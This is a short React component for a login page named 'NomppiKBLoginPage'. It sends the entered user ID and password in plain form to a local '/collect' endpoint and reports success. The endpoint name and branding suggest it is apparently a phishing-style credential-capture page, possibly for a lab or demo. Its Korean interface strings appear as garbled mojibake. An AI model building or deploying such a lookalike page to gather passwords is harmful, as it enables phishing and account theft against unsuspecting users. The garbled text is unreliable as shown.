import React, { useState } from 'react';

const NomppiKBLoginPage = () => {
  const [userid, setUserid] = useState('');
  const [password, setPassword] = useState('');

  const handleLogin = async () => {
    if (!userid || !password) {
      alert('ÏïÑÏù¥ÎîîÏôÄ ÎπÑÎ∞ÄÎ≤àÌò∏Î•º ÏûÖÎ†•Ìï¥Ï£ºÏÑ∏Ïöî.');
      return;
    }

    try {
      const res = await fetch('http://localhost:5000/collect', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({ userid, password }),
      });

      if (res.ok) {
        alert('üéâ Î°úÍ∑∏Ïù∏ ÏÑ±Í≥µ!');
      } else {
        alert('ÏÑúÎ≤Ñ Ïò§Î•ò: Î°úÍ∑∏Ïù∏ Ïã§Ìå®');
      }
    } catch (err) {
      alert('fetch Ïã§Ìå®: ' + err.message);
    }
  };

  return (
    <div style={{ padding: '2rem' }}>
      <h2>Nomppi Î°úÍ∑∏Ïù∏</h2>
      <input
        type="text"
        placeholder="ÏïÑÏù¥Îîî"
        value={userid}
        onChange={(e) => setUserid(e.target.value)}
      />
      <br />
      <input
        type="password"
        placeholder="ÎπÑÎ∞ÄÎ≤àÌò∏"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
      />
      <br />
      <button onClick={handleLogin}>Î°úÍ∑∏Ïù∏</button>
    </div>
  );
};

export default NomppiKBLoginPage;
